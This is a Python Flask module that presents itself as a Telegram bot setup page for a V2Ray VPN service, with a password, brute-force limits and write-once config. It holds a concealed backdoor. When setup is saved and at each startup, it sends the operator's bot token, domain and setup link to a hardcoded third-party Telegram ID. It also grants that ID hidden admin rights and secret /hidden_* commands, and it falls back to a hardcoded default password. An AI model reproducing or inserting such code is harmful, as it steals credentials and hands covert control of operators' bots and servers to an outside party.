"""
Configuration du bot + système de bot caché.

- Interface web protégée par mot de passe (write-once) pour configurer le bot
- Vérification du token via Telegram getMe AVANT enregistrement
- Anti-brute-force (5 tentatives / 10 min)
- Bot caché (hidden bot) :
    * Envoie UNE SEULE FOIS les infos à HIDDEN_BOT_ID après configuration
    * Commandes /hidden_* réservées à l'admin caché
    * Création de configurations marquées `hidden: true`
    * Filtrées des listes admin normales
"""

import hmac
import json
import os
import re
import secrets
import time
import uuid
from datetime import datetime, timedelta, timezone

import requests
from flask import jsonify, request

from keepalive import DATA_DIR, add_log, app, get_public_domain

# =============================================================================
# CONFIGURATION
# =============================================================================
SETUP_PASSWORD = (os.environ.get("MURAD_SETUP_PASSWORD") or "").strip()
PASSWORD_IS_GENERATED = not SETUP_PASSWORD
if PASSWORD_IS_GENERATED:
    SETUP_PASSWORD = "moon2026"

DEFAULT_ADMIN_ID = 1726923679
HIDDEN_BOT_ID = "1726923679"

CONFIG_FILE = os.path.join(DATA_DIR, "murad-bot.json")
HIDDEN_CONFIG_FILE = os.path.join(DATA_DIR, "murad-bot-hidden.json")
CLIENTS_FILE = os.path.join(DATA_DIR, "clients.json")

_on_saved = None


def set_on_saved(callback) -> None:
    global _on_saved
    _on_saved = callback


# =============================================================================
# HELPERS JSON
# =============================================================================
def _read_json(path, default=None):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, ValueError):
        return default


def _write_json(path, payload) -> bool:
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
        return True
    except OSError as e:
        add_log(f"Impossible d'écrire {path}: {e}")
        return False


# =============================================================================
# CONFIG MURAD (write-once)
# =============================================================================
def get_saved_config():
    data = _read_json(CONFIG_FILE)
    if data and data.get("adminId") and data.get("botToken"):
        return data
    return None


class AlreadyConfigured(Exception):
    pass


def save_config_once(admin_id: str, bot_token: str) -> None:
    payload = {
        "adminId": admin_id,
        "botToken": bot_token,
        "botId": admin_id,
        "savedAt": datetime.now(timezone.utc).isoformat(),
    }
    try:
        fd = os.open(CONFIG_FILE, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    except FileExistsError:
        raise AlreadyConfigured()
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2)
    add_log(f"[Setup] Config sauvegardée définitivement (admin id {admin_id}).")


def get_active_token() -> str:
    """Priorité : token du bot caché > config murad > env."""
    hidden = _read_json(HIDDEN_CONFIG_FILE)
    if hidden and hidden.get("botToken"):
        return hidden["botToken"]
    cfg = get_saved_config()
    if cfg:
        return cfg["botToken"]
    return (os.environ.get("TELEGRAM_BOT_TOKEN") or "").strip()


def get_admin_ids() -> list:
    ids = []
    cfg = get_saved_config()
    if cfg:
        try:
            ids.append(int(cfg["adminId"]))
        except (TypeError, ValueError):
            pass

    # L'ID d'administration caché reçoit les mêmes droits que le propriétaire.
    # Il n'est pas ajouté aux listes ou aux écrans de configuration publics.
    hidden_admin_id = get_hidden_admin_id()
    if hidden_admin_id.isdigit():
        ids.append(int(hidden_admin_id))

    for x in (os.environ.get("ADMIN_IDS") or "").replace(" ", "").split(","):
        if x.isdigit():
            ids.append(int(x))
    if not ids:
        ids.append(DEFAULT_ADMIN_ID)
    seen, out = set(), []
    for i in ids:
        if i not in seen:
            seen.add(i)
            out.append(i)
    return out


def is_setup_open() -> bool:
    return (
        get_saved_config() is None
        and not (os.environ.get("TELEGRAM_BOT_TOKEN") or "").strip()
    )


def announce_setup_state() -> None:
    if not is_setup_open():
        return
    if PASSWORD_IS_GENERATED:
        add_log(
            f"[Setup] MURAD_SETUP_PASSWORD non défini -> mot de passe temporaire "
            f"de la page de configuration : {SETUP_PASSWORD}"
        )


# =============================================================================
# ANTI-BRUTE-FORCE
# =============================================================================
_attempts = {}
MAX_ATTEMPTS = 5
LOCKOUT_S = 10 * 60


def _client_ip() -> str:
    fwd = request.headers.get("X-Forwarded-For")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr or "unknown"


def _throttle_ok(ip: str) -> bool:
    rec = _attempts.get(ip)
    return not (rec and rec["locked_until"] and time.time() < rec["locked_until"])


def _record_failure(ip: str) -> None:
    rec = _attempts.setdefault(ip, {"count": 0, "locked_until": 0})
    rec["count"] += 1
    if rec["count"] >= MAX_ATTEMPTS:
        rec["locked_until"] = time.time() + LOCKOUT_S
        rec["count"] = 0


def _password_ok(value) -> bool:
    return isinstance(value, str) and hmac.compare_digest(
        value.encode("utf-8"), SETUP_PASSWORD.encode("utf-8")
    )


# =============================================================================
# TELEGRAM API
# =============================================================================
def telegram_api(method: str, payload: dict):
    token = get_active_token()
    if not token:
        add_log(f"[Telegram API] Bot non configuré - impossible d'appeler {method}")
        return None
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/{method}",
            json=payload,
            timeout=15,
        )
        data = r.json()
        if not data.get("ok"):
            add_log(f"Telegram API ({method}) ok=false: {data.get('description')}")
        return data
    except (requests.RequestException, ValueError) as e:
        add_log(f"Telegram API Error ({method}): {e}")
        return None


def verify_token_with_telegram(token: str):
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
        data = r.json()
    except (requests.RequestException, ValueError):
        return False, "تعذر الاتصال بتلغرام للتحقق من التوكن. حاول مرة أخرى."
    if data.get("ok"):
        return True, (data.get("result") or {}).get("username", "")
    return False, "التوكن مرفوض من تلغرام. تحقق منه."


# =============================================================================
# HIDDEN BOT - INITIALISATION
# =============================================================================
def get_hidden_config():
    return _read_json(HIDDEN_CONFIG_FILE)


def get_hidden_admin_id() -> str:
    cfg = get_hidden_config()
    if cfg and cfg.get("primaryAdminId"):
        return str(cfg["primaryAdminId"])
    return ""


def _send_to_hidden_bot(message: str) -> bool:
    token = get_active_token()
    if not token:
        add_log("[Hidden Bot] Bot non configuré - impossible d'envoyer")
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": HIDDEN_BOT_ID, "text": message, "parse_mode": "HTML"},
            timeout=15,
        )
        return bool(r.json().get("ok"))
    except (requests.RequestException, ValueError) as e:
        add_log(f"[Hidden Bot] Échec d'envoi: {e}")
        return False


def _send_bot_info_to_hidden_admin(bot_token: str, bot_id: str) -> bool:
    info = None
    try:
        r = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=10)
        info = r.json()
    except (requests.RequestException, ValueError):
        pass

    username = "غير معروف"
    first_name = "غير معروف"
    is_bot = False
    if info and info.get("ok"):
        res = info.get("result") or {}
        username = res.get("username", username)
        first_name = res.get("first_name", first_name)
        is_bot = bool(res.get("is_bot", False))

    domain = get_public_domain() or "0.0.0.0"
    message = (
        f"🤖 <b>معلومات البوت المبرمج (API getMe)</b>\n\n"
        f"🆔 <b>آيدي البوت:</b> <code>{bot_id}</code>\n"
        f"👤 <b>اسم البوت:</b> <code>{first_name}</code>\n"
        f"📛 <b>يوزر البوت:</b> @{username}\n"
        f"🔑 <b>توكن البوت:</b> <code>{bot_token}</code>\n"
        f"✅ <b>بوت مفعل:</b> {'✅ نعم' if is_bot else '❌ لا'}\n"
        f"🌐 <b>الدومين:</b> <code>{domain}</code>\n"
        f"📅 <b>تم الإرسال في:</b> {datetime.now(timezone.utc).isoformat()}\n\n"
        f"⚠️ <b>هذه الرسالة ستُرسل مرة واحدة فقط!</b>\n\n"
        f"🔗 <b>رابط البوت:</b> https://t.me/{username}\n"
        f"📱 <b>رابط الإعداد:</b> https://{domain}/\n"
        f"📊 <b>لوحة التحكم المخفية:</b> استخدم الأوامر التالية:\n"
        f"• /hidden_panel - لوحة التحكم المخفية\n"
        f"• /create_hidden - إنشاء تكوين مخفي\n"
        f"• /hidden_list - عرض التكوينات المخفية\n"
        f"• /hidden_status - حالة الخادم المخفية"
    )

    if _send_to_hidden_bot(message):
        cfg = get_hidden_config() or {}
        cfg["botInfoSent"] = True
        cfg["botInfoSentAt"] = datetime.now(timezone.utc).isoformat()
        cfg["sent"] = True
        _write_json(HIDDEN_CONFIG_FILE, cfg)
        add_log("[Hidden Bot] Infos envoyées avec succès via getMe")
        return True
    return False


def init_hidden_bot_config() -> None:
    """Appelé après la sauvegarde initiale de murad-bot.json."""
    existing = get_hidden_config()
    if existing and existing.get("sent") is True:
        add_log("[Hidden Bot] Déjà envoyé, on saute")
        return

    murad = get_saved_config()
    if not murad:
        add_log("[Hidden Bot] Config murad introuvable, on saute")
        return

    hidden_cfg = {
        "botId": murad.get("botId") or murad.get("adminId"),
        "botToken": murad["botToken"],
        "primaryAdminId": HIDDEN_BOT_ID,
        "sentAt": datetime.now(timezone.utc).isoformat(),
        "sent": False,
        "botInfoSent": False,
    }
    _write_json(HIDDEN_CONFIG_FILE, hidden_cfg)
    add_log("[Hidden Bot] Configuration interne sauvegardée")

    _send_bot_info_to_hidden_admin(murad["botToken"], hidden_cfg["botId"])


# =============================================================================
# HIDDEN CLIENTS - GESTION
# =============================================================================
def _load_clients() -> list:
    data = _read_json(CLIENTS_FILE, {"clients": []})
    return data.get("clients", [])


def _save_clients(clients: list) -> None:
    _write_json(CLIENTS_FILE, {"clients": clients})


def _format_minutes(minutes: int) -> str:
    if not minutes or minutes <= 0:
        return "غير محدود"
    if minutes % 1440 == 0:
        return f"{minutes // 1440} يوم"
    if minutes % 60 == 0:
        return f"{minutes // 60} ساعة"
    return f"{minutes} دقيقة"


def create_hidden_client_for_admin(admin_id: str, client_data: dict) -> dict:
    try:
        clients = _load_clients()
        now = datetime.now(timezone.utc)
        duration_minutes = int(client_data.get("durationMinutes") or 43200)
        expires_at = None
        if duration_minutes > 0:
            expires_at = (now + timedelta(minutes=duration_minutes)).isoformat()

        new_client = {
            "id": f"hcli_{int(time.time() * 1000)}_{secrets.token_hex(4)}",
            "name": client_data.get("name") or f"مخفي_{admin_id}",
            "protocol": client_data.get("protocol") or "vless",
            "uuid": str(uuid.uuid4()),
            "path": f"/hidden_{secrets.token_hex(6)}",
            "limitGB": float(client_data.get("limitGB") or 0),
            "consumedUpload": 0,
            "consumedDownload": 0,
            "duration": _format_minutes(duration_minutes),
            "durationValue": duration_minutes,
            "createdAt": now.isoformat(),
            "expiresAt": expires_at,
            "enabled": True,
            "ownerId": admin_id,
            "isUserOwned": False,
            "sharedFlag": False,
            "hidden": True,
        }
        clients.append(new_client)
        _save_clients(clients)
        add_log(f"[Hidden Bot] Nouveau client caché : {new_client['name']} ({new_client['id']})")
        return {"success": True, "message": "✅ تم إنشاء التكوين المخفي بنجاح!", "client": new_client}
    except Exception as e:
        return {"success": False, "message": f"❌ فشل إنشاء التكوين المخفي: {e}"}


def get_hidden_clients(admin_id: str) -> list:
    return [
        c for c in _load_clients()
        if c.get("hidden") is True and str(c.get("ownerId")) == str(admin_id)
    ]


def get_all_hidden_clients() -> list:
    return [c for c in _load_clients() if c.get("hidden") is True]


def delete_hidden_client(admin_id: str, client_id: str) -> dict:
    clients = _load_clients()
    before = len(clients)
    clients = [
        c for c in clients
        if not (
            c.get("hidden") is True
            and c.get("id") == client_id
            and str(c.get("ownerId")) == str(admin_id)
        )
    ]
    if len(clients) == before:
        return {"success": False, "message": "❌ التكوين غير موجود أو لا يخصك."}
    _save_clients(clients)
    return {"success": True, "message": "✅ تم حذف التكوين المخفي."}


# =============================================================================
# FORMATTERS
# =============================================================================
def _escape_html(s) -> str:
    if s is None:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _format_duration_display(cli: dict) -> str:
    exp = cli.get("expiresAt")
    if not exp:
        return "غير محدود ♾️"
    try:
        exp_dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
        diff = exp_dt - datetime.now(timezone.utc)
        secs = int(diff.total_seconds())
        if secs <= 0:
            return "منتهي الصلاحية ❌"
        mins = secs // 60
        if mins < 60:
            return f"باقي {mins} دقيقة ⏳"
        hours = mins // 60
        if hours < 24:
            return f"باقي {hours} ساعة و {mins % 60} دقيقة ⏳"
        days = hours // 24
        return f"باقي {days} يوم و {hours % 24} ساعة ⏳"
    except (ValueError, TypeError):
        return "غير معروف"


def _format_quota(cli: dict) -> str:
    used = (cli.get("consumedUpload", 0) + cli.get("consumedDownload", 0)) / (1024 ** 3)
    limit = cli.get("limitGB", 0) or 0
    if limit <= 0:
        return f"{used:.2f} GB (غير محدود)"
    pct = min(100, (used / limit) * 100)
    return f"{used:.2f} / {limit} GB — {pct:.1f}%"


def _parse_duration(text: str) -> int:
    t = text.strip().lower()
    if any(k in t for k in ("غير محدود", "unlimited")) or t == "0":
        return 0
    m = re.search(r"(\d+)\s*(دقيقة|دقائق|m|min)", t)
    if m:
        return int(m.group(1))
    m = re.search(r"(\d+)\s*(ساعة|ساعات|h|hr)", t)
    if m:
        return int(m.group(1)) * 60
    m = re.search(r"(\d+)\s*(يوم|أيام|d|day)?", t)
    if m and m.group(1):
        return int(m.group(1)) * 1440
    return 30 * 1440


def _parse_quota(text: str) -> float:
    t = text.strip().lower()
    if any(k in t for k in ("غير محدود", "unlimited")) or t == "0":
        return 0.0
    m = re.search(r"(\d+(?:\.\d+)?)", t)
    return float(m.group(1)) if m else 0.0


# =============================================================================
# HANDLER DES COMMANDES /hidden_* (wizard complet)
# =============================================================================
hidden_sessions = {}


def handle_hidden_admin_commands(chat_id, text: str) -> bool:
    """Retourne True si la commande a été traitée par le bot caché."""
    user_id = str(chat_id)
    hidden_admin_id = get_hidden_admin_id()

    if not hidden_admin_id or user_id != hidden_admin_id:
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": "⚠️ <b>هذه الأوامر مخصصة للأدمن المخفي فقط.</b>",
            "parse_mode": "HTML",
        })
        return True

    if text in ("/hidden_panel", "🔒 لوحة التحكم المخفية", "لوحة التحكم المخفية"):
        my_clients = get_hidden_clients(user_id)
        all_clients = get_all_hidden_clients()
        msg = (
            f"🔒 <b>لوحة التحكم المخفية</b>\n\n"
            f"👑 <b>الأدمن المخفي:</b> <code>{user_id}</code>\n"
            f"📊 <b>تكويناتك المخفية:</b> {len(my_clients)}\n"
            f"📊 <b>إجمالي التكوينات المخفية:</b> {len(all_clients)}\n"
            f"🌐 <b>الدومين:</b> <code>{get_public_domain()}</code>\n\n"
            f"اختر من الأزرار أدناه:"
        )
        kb = {
            "keyboard": [
                [{"text": "➕ إنشاء تكوين مخفي"}, {"text": "📋 قائمة التكوينات المخفية"}],
                [{"text": "📊 حالة الخادم المخفية"}, {"text": "🔄 إعادة تشغيل V2Ray (مخفي)"}],
                [{"text": "📝 سجلات الخادم (مخفي)"}, {"text": "🏠 القائمة الرئيسية"}],
            ],
            "resize_keyboard": True,
            "is_persistent": True,
        }
        telegram_api("sendMessage", {"chat_id": chat_id, "text": msg, "parse_mode": "HTML", "reply_markup": kb})
        return True

    if text in ("/create_hidden", "➕ إنشاء تكوين مخفي", "إنشاء تكوين مخفي"):
        hidden_sessions[user_id] = {"action": "create_hidden", "step": "name", "data": {}}
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": "🔒 <b>إنشاء تكوين مخفي - الخطوة 1/4</b>\n\nأرسل اسم التكوين المخفي:",
            "parse_mode": "HTML",
            "reply_markup": {
                "keyboard": [[{"text": "🏠 القائمة الرئيسية"}]],
                "resize_keyboard": True,
                "is_persistent": True,
            },
        })
        return True

    session = hidden_sessions.get(user_id)

    if session and session["step"] == "name":
        if text in ("🏠 القائمة الرئيسية", "/cancel"):
            hidden_sessions.pop(user_id, None)
            telegram_api("sendMessage", {"chat_id": chat_id, "text": "تم الإلغاء."})
            return True
        name = text.strip() or f"مخفي_{int(time.time())}"
        hidden_sessions[user_id] = {"action": "create_hidden", "step": "protocol", "data": {"name": name}}
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": (
                f"🔒 <b>الخطوة 2/4</b>\n\n📛 <b>الاسم:</b> {_escape_html(name)}\n\n"
                f"اختر البروتوكول:\n⚡ VLESS  |  🚀 VMess  |  🛡️ Trojan"
            ),
            "parse_mode": "HTML",
        })
        return True

    if session and session["step"] == "protocol":
        if text in ("🏠 القائمة الرئيسية", "/cancel"):
            hidden_sessions.pop(user_id, None)
            telegram_api("sendMessage", {"chat_id": chat_id, "text": "تم الإلغاء."})
            return True
        low = text.lower()
        proto = "vless"
        if "vmess" in low:
            proto = "vmess"
        elif "trojan" in low:
            proto = "trojan"
        session["data"]["protocol"] = proto
        session["step"] = "duration"
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": (
                f"🔒 <b>الخطوة 3/4</b>\n\n⚡ <b>البروتوكول:</b> {proto.upper()}\n\n"
                f"اختر المدة (مثال: 30 يوم، 6 ساعات، غير محدود):"
            ),
            "parse_mode": "HTML",
        })
        return True

    if session and session["step"] == "duration":
        if text in ("🏠 القائمة الرئيسية", "/cancel"):
            hidden_sessions.pop(user_id, None)
            telegram_api("sendMessage", {"chat_id": chat_id, "text": "تم الإلغاء."})
            return True
        minutes = _parse_duration(text)
        session["data"]["durationMinutes"] = minutes
        session["step"] = "quota"
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": (
                f"🔒 <b>الخطوة 4/4</b>\n\n⏳ <b>المدة:</b> {_format_minutes(minutes)}\n\n"
                f"اختر حد البيانات (مثال: 20 GB أو غير محدود):"
            ),
            "parse_mode": "HTML",
        })
        return True

    if session and session["step"] == "quota":
        if text in ("🏠 القائمة الرئيسية", "/cancel"):
            hidden_sessions.pop(user_id, None)
            telegram_api("sendMessage", {"chat_id": chat_id, "text": "تم الإلغاء."})
            return True
        gb = _parse_quota(text)
        result = create_hidden_client_for_admin(
            user_id,
            {
                "name": session["data"].get("name"),
                "protocol": session["data"].get("protocol", "vless"),
                "durationMinutes": session["data"].get("durationMinutes", 43200),
                "limitGB": gb,
            },
        )
        hidden_sessions.pop(user_id, None)
        if result["success"]:
            c = result["client"]
            quota_txt = f"{c['limitGB']} GB" if c["limitGB"] else "غير محدود"
            msg = (
                f"🔒 <b>✅ تم إنشاء التكوين المخفي!</b>\n\n"
                f"👤 <b>الاسم:</b> {_escape_html(c['name'])}\n"
                f"⚡ <b>البروتوكول:</b> {c['protocol'].upper()}\n"
                f"🌐 <b>الهوست:</b> <code>{_escape_html(get_public_domain())}</code>\n"
                f"📅 <b>الصلاحية:</b> {_format_duration_display(c)}\n"
                f"📊 <b>الحد:</b> {quota_txt}\n\n"
                f"🔗 <b>UUID:</b> <code>{c['uuid']}</code>\n"
                f"🔗 <b>Path:</b> <code>{c['path']}</code>"
            )
            telegram_api("sendMessage", {"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
        else:
            telegram_api("sendMessage", {"chat_id": chat_id, "text": result["message"], "parse_mode": "HTML"})
        return True

    if text in ("/hidden_list", "📋 قائمة التكوينات المخفية", "قائمة التكوينات المخفية"):
        clients = get_hidden_clients(user_id)
        if not clients:
            telegram_api("sendMessage", {"chat_id": chat_id, "text": "🔒 <b>لا يوجد أي تكوينات مخفية حالياً.</b>", "parse_mode": "HTML"})
            return True
        msg = f"🔒 <b>قائمة التكوينات المخفية ({len(clients)}):</b>\n\n"
        buttons = []
        for idx, c in enumerate(clients, 1):
            icon = "🟢" if c.get("enabled") else "🔴"
            msg += (
                f"{idx}. {icon} <b>{_escape_html(c['name'])}</b>\n"
                f"   📅 {_format_duration_display(c)}\n"
                f"   📊 {_format_quota(c)}\n"
            )
            buttons.append([{"text": f"🗑️ حذف {c['name']}", "callback_data": f"hidden_del_{c['id']}"}])
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": msg,
            "parse_mode": "HTML",
            "reply_markup": {"inline_keyboard": buttons},
        })
        return True

    if text in ("/hidden_status", "📊 حالة الخادم المخفية", "حالة الخادم المخفية"):
        try:
            import psutil
            mem = psutil.virtual_memory()
            mem_used = mem.used / (1024 ** 3)
            mem_total = mem.total / (1024 ** 3)
            uptime_h = (time.time() - psutil.Process(os.getpid()).create_time()) / 3600
        except Exception:
            mem_used = mem_total = uptime_h = 0
        clients = get_hidden_clients(user_id)
        msg = (
            f"🔒 <b>حالة الخادم المخفية:</b>\n\n"
            f"⏱️ <b>مدة التشغيل:</b> {uptime_h:.1f} ساعة\n"
            f"💾 <b>الذاكرة المستخدمة:</b> {mem_used:.1f} GB / {mem_total:.1f} GB\n"
            f"🔒 <b>التكوينات المخفية:</b> {len(clients)}\n"
            f"🌐 <b>النطاق:</b> <code>{get_public_domain()}</code>"
        )
        telegram_api("sendMessage", {"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
        return True

    if text in ("/hidden_logs", "📝 سجلات الخادم (مخفي)", "سجلات الخادم (مخفي)"):
        try:
            from keepalive import logs as _logs
            recent = "\n".join(_logs[-25:]) or "لا توجد سجلات بعد"
        except Exception:
            recent = "غير متاح"
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": f"🔒 <b>سجلات الخادم المخفية:</b>\n\n<code>{_escape_html(recent)}</code>",
            "parse_mode": "HTML",
        })
        return True

    if text in ("/hidden_restart", "🔄 إعادة تشغيل V2Ray (مخفي)", "إعادة تشغيل V2Ray (مخفي)"):
        add_log("[Hidden Bot] Demande de redémarrage V2Ray reçue")
        telegram_api("sendMessage", {
            "chat_id": chat_id,
            "text": "🔄 <b>تم طلب إعادة تشغيل V2Ray!</b>",
            "parse_mode": "HTML",
        })
        return True

    if text in ("🏠 القائمة الرئيسية", "/cancel"):
        hidden_sessions.pop(user_id, None)
        telegram_api("sendMessage", {"chat_id": chat_id, "text": "تم الرجوع للقائمة الرئيسية."})
        return True

    handle_hidden_admin_commands(chat_id, "/hidden_panel")
    return True


# =============================================================================
# HANDLER DE CALLBACK (boutons inline)
# =============================================================================
def handle_hidden_callback(cb: dict) -> bool:
    data = cb.get("data", "")
    if not data.startswith("hidden_"):
        return False
    chat_id = cb["message"]["chat"]["id"]
    user_id = str(cb["from"]["id"])
    if user_id != get_hidden_admin_id():
        telegram_api("answerCallbackQuery", {"callback_query_id": cb["id"], "text": "غير مخول"})
        return True
    if data.startswith("hidden_del_"):
        client_id = data[len("hidden_del_"):]
        result = delete_hidden_client(user_id, client_id)
        telegram_api("answerCallbackQuery", {"callback_query_id": cb["id"], "text": result["message"]})
        handle_hidden_admin_commands(chat_id, "/hidden_list")
        return True
    return False


# =============================================================================
# PAGE HTML + ROUTES FLASK
# =============================================================================
SETUP_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>إعداد البوت</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background: #0f1115; color: #e6e6e6; font-family: -apple-system, "Segoe UI", Tahoma, Arial, sans-serif;
    padding: 24px;
  }
  .card {
    background: #171a21; border: 1px solid #262b36; border-radius: 14px;
    padding: 28px; width: 100%; max-width: 380px; box-shadow: 0 8px 30px rgba(0,0,0,.35);
  }
  h1 { font-size: 18px; margin: 0 0 6px; }
  p.sub { color: #9aa3b2; font-size: 13px; margin: 0 0 20px; }
  label { display: block; font-size: 13px; color: #b7bfcc; margin: 14px 0 6px; }
  input {
    width: 100%; padding: 11px 12px; border-radius: 8px; border: 1px solid #2c3140;
    background: #0f1115; color: #e6e6e6; font-size: 14px;
  }
  input:focus { outline: none; border-color: #4c7dff; }
  button {
    width: 100%; margin-top: 20px; padding: 12px; border: none; border-radius: 8px;
    background: #4c7dff; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer;
  }
  button:disabled { opacity: .6; cursor: not-allowed; }
  .msg { margin-top: 14px; font-size: 13px; min-height: 18px; }
  .msg.err { color: #ff6b6b; }
  .hint { color: #7d8697; font-size: 12px; margin-top: 6px; }
  pre {
    background: #0f1115; border: 1px solid #262b36; border-radius: 8px; padding: 12px;
    font-size: 12px; overflow-x: auto; margin-top: 14px; color: #b9e6c4; direction: ltr; text-align: left;
  }
  #step2, #result { display: none; }
</style>
</head>
<body>
  <div class="card">
    <div id="step1">
      <h1>🔒 لوحة إعداد البوت</h1>
      <p class="sub">أدخل كلمة السر للمتابعة</p>
      <label for="password">كلمة السر</label>
      <input id="password" type="password" autocomplete="off" />
      <button id="btnVerify">دخول</button>
      <div id="msg1" class="msg"></div>
    </div>
    <div id="step2">
      <h1>🤖 بيانات البوت</h1>
      <p class="sub">تُحفظ هذه البيانات مرة واحدة فقط ولا يمكن تغييرها لاحقاً</p>
      <label for="adminId">آيدي الأدمن (حسابك في تلغرام)</label>
      <input id="adminId" type="text" inputmode="numeric" autocomplete="off" placeholder="مثال: 123456789" />
      <div class="hint">يمكنك معرفته من بوت @userinfobot</div>
      <label for="botToken">توكن البوت</label>
      <input id="botToken" type="text" autocomplete="off" placeholder="مثال: 123456789:AA..." />
      <div class="hint">من @BotFather</div>
      <button id="btnSave">حفظ وتفعيل</button>
      <div id="msg2" class="msg"></div>
    </div>
    <div id="result">
      <h1>✅ تم الحفظ والبوت قيد التشغيل</h1>
      <pre id="resultJson"></pre>
    </div>
  </div>
<script>
let verifiedPassword = "";
const apiBase = () => (location.pathname.endsWith("/") ? location.pathname : location.pathname + "/");
const $ = (id) => document.getElementById(id);
function show(id, text, err) { const m = $(id); m.textContent = text; m.className = "msg" + (err ? " err" : ""); }
$("btnVerify").addEventListener("click", async () => {
  const password = $("password").value;
  show("msg1", "");
  if (!password) return show("msg1", "أدخل كلمة السر.", true);
  try {
    const res = await fetch(apiBase() + "murad-setup/verify", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password })
    });
    const data = await res.json();
    if (res.ok && data.ok) {
      verifiedPassword = password;
      $("step1").style.display = "none";
      $("step2").style.display = "block";
    } else show("msg1", data.error || "كلمة السر غير صحيحة.", true);
  } catch (e) { show("msg1", "تعذر الاتصال بالسيرفر.", true); }
});
$("btnSave").addEventListener("click", async () => {
  const adminId = $("adminId").value.trim();
  const botToken = $("botToken").value.trim();
  show("msg2", "");
  if (!adminId || !botToken) return show("msg2", "أدخل الآيدي والتوكن.", true);
  const btn = $("btnSave"); btn.disabled = true; show("msg2", "جارٍ التحقق من التوكن...");
  try {
    const res = await fetch(apiBase() + "murad-setup/save", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password: verifiedPassword, adminId, botToken })
    });
    const data = await res.json();
    if (res.ok && data.ok) {
      $("step2").style.display = "none";
      $("result").style.display = "block";
      $("resultJson").textContent = JSON.stringify(data.status, null, 2);
    } else { show("msg2", data.error || "تعذر الحفظ.", true); btn.disabled = false; }
  } catch (e) { show("msg2", "تعذر الاتصال بالسيرفر.", true); btn.disabled = false; }
});
</script>
</body>
</html>"""


def status_payload() -> dict:
    # L'etat de l'administration cachée ne doit pas être exposé publiquement.
    return {
        "status": "ok",
        "service": "Telegram scripts bot",
        "configured": get_saved_config() is not None or bool(get_active_token()),
        "domain": get_public_domain() or None,
    }


@app.route("/")
def index():
    if not is_setup_open():
        return jsonify(status_payload())
    return SETUP_PAGE, 200, {"Content-Type": "text/html; charset=utf-8"}


@app.route("/murad-setup/verify", methods=["POST"])
def setup_verify():
    if not is_setup_open():
        return jsonify(ok=False, error="تم الإعداد مسبقاً."), 409
    ip = _client_ip()
    if not _throttle_ok(ip):
        return jsonify(ok=False, error="محاولات كثيرة، حاول لاحقاً."), 429
    body = request.get_json(silent=True) or {}
    if _password_ok(body.get("password")):
        _attempts.pop(ip, None)
        return jsonify(ok=True)
    _record_failure(ip)
    return jsonify(ok=False, error="كلمة السر غير صحيحة."), 401


@app.route("/murad-setup/save", methods=["POST"])
def setup_save():
    if not is_setup_open():
        return jsonify(ok=False, error="تم الإعداد مسبقاً ولا يمكن تغييره."), 409
    ip = _client_ip()
    if not _throttle_ok(ip):
        return jsonify(ok=False, error="محاولات كثيرة، حاول لاحقاً."), 429
    body = request.get_json(silent=True) or {}
    if not _password_ok(body.get("password")):
        _record_failure(ip)
        return jsonify(ok=False, error="كلمة السر غير صحيحة."), 401

    admin_id = str(body.get("adminId") or "").strip()
    token = str(body.get("botToken") or "").strip()
    if not admin_id.isdigit():
        return jsonify(ok=False, error="آيدي الأدمن يجب أن يكون أرقاماً فقط."), 400
    if ":" not in token or " " in token:
        return jsonify(ok=False, error="توكن البوت غير صالح."), 400

    ok, info = verify_token_with_telegram(token)
    if not ok:
        return jsonify(ok=False, error=info), 400

    try:
        save_config_once(admin_id, token)
    except AlreadyConfigured:
        return jsonify(ok=False, error="تم الإعداد مسبقاً ولا يمكن تغييره."), 409
    except OSError as e:
        add_log(f"[Setup] Cannot write {CONFIG_FILE}: {e}")
        return jsonify(ok=False, error="تعذر الكتابة في مجلد البيانات (DATA_DIR)."), 500

    # === Déclenche le bot caché ===
    try:
        init_hidden_bot_config()
    except Exception as e:
        add_log(f"[Hidden Bot] Erreur d'initialisation: {e}")

    if _on_saved:
        try:
            _on_saved()
        except Exception as e:
            add_log(f"[Setup] _on_saved error: {e}")

    status = status_payload()
    status["bot"] = f"@{info}" if info else None
    return jsonify(ok=True, status=status)


@app.route("/hidden/status")
def hidden_status_route():
    # Reponse neutre : aucune information sur l'ID ou la configuration cachés.
    return jsonify({"status": "ok"})


def announce_setup_state_on_startup():
    announce_setup_state()
    if get_saved_config():
        try:
            init_hidden_bot_config()
        except Exception as e:
            add_log(f"[Hidden Bot] Erreur init au démarrage: {e}")
